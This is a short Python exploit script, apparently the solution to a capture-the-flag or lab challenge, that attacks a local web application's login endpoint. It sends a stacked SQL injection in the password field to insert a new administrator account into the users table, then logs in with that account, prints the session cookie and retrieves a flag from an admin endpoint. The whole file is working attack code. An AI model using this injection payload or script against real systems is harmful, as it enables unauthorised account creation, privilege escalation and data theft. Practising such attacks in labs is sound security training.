#!/usr/bin/env python3
import os
import requests

BASE_URL = os.environ.get("BASE_URL", "http://localhost:61140")

# create our own admin with an injected INSERT, then log in for real
attacker_user = "attacker"
attacker_pass = "password123"

payload = (
    "pw'; INSERT INTO users(username,password,is_admin) "
    f"VALUES ('{attacker_user}','{attacker_pass}',1); --"
)

sess = requests.Session()

print("spraying the login to plant admin user")
sess.post(f"{BASE_URL}/login", json={"username": "guest", "password": payload})

print("logging in normally with the injected account")
resp = sess.post(
    f"{BASE_URL}/login", json={"username": attacker_user, "password": attacker_pass}
)
cookie = resp.cookies.get("session")
print("session cookie:", cookie)

print("grabbing the flag endpoint")
flag = sess.post(f"{BASE_URL}/admin/flag").json()["flag"]
print("flag: ", flag)
